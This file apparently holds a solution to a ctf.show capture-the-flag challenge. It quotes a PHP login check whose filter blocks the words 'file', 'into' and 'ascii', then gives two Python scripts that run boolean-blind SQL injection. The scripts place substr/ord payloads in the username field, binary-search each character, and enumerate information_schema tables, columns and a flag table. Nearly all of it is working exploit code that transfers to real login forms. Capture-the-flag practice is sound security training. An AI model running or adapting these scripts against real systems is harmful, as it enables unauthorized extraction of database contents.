'''

 //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

    if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
'''

# @Author:feng
# import requests
# from time import time
#
# url = 'http://7426ef61-2e74-4eff-8403-adc15baaeb2d.chall.ctf.show:8080/api/index.php'
#
# flag = ''
# for i in range(1, 100):
#     length = len(flag)
#     min = 32
#     max = 128
#     while 1:
#         j = min + (max - min) // 2
#         if min == j:
#             flag += chr(j)
#             print(f'次数{i}, ascii {j}')
#             print(flag.lower())
#             if chr(j) == " ":
#                 exit()
#             break
#
#         payload = "' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1)<'{}',1,0)-- -".format(i, chr(j))
#         print(payload)
#         data = {
#             'username': payload,
#             'password': 1
#         }
#         r = requests.post(url=url, data=data).text
#         # print(r)
#         if r"\u5bc6\u7801\u9519\u8bef" in r:
#             max = j
#         else:
#             min = j


# @Author:Y4tacker
import requests

url = "http://7426ef61-2e74-4eff-8403-adc15baaeb2d.chall.ctf.show:8080/api/index.php"

result = ""
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查字段
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        # 查flag
        # payload = "select group_concat(f1ag) from ctfshow_fl0g"
        data = {
            'username': f"admin' and ord(substr(({payload}),{i},1))>{mid}-- -",
            'password': '1'
        }
        print(f'i={i}, mid={mid}, head={head}, tail={tail}')
        print(data['username'])
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            head = mid + 1
        else:
            # print(r.text)
            tail = mid

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
